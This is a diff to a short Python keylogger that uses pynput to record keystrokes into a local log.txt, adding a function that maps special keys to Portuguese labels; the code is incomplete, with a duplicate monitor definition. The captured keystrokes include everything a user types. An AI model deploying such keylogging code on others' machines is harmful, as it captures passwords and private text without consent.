@@ -3,16 +3,27 @@ from pynput.keyboard import Listener, Key
 def log(text):
     with open("log.txt", "a") as file_log:
         file_log.write(text)
+    
+def monitor(key):
+    if key == Key.enter:
+        key = ' '
+        log(" ")
 
-    if key == 'Key.space':
-        key == ' '
-    if key == 'Key.shift_r':
-        key == ' '
-    if key == 'Key.enter':
-        key == '\n'
+    if key == Key.backspace:
+        key = 'apagar'
 
-        with open("log.txt", 'a') as f:
-            f.write(key)
+    if key == Key.space:
+        key = ' '
+
+    if key == Key.shift_r:
+        key = 'shif_direito'
+
+    if key == Key.shift:
+        key = 'shift_esquerdo'
+
+    if key == Key.cmd:
+        key = 'windows'
+
 
  
 def monitor(key):
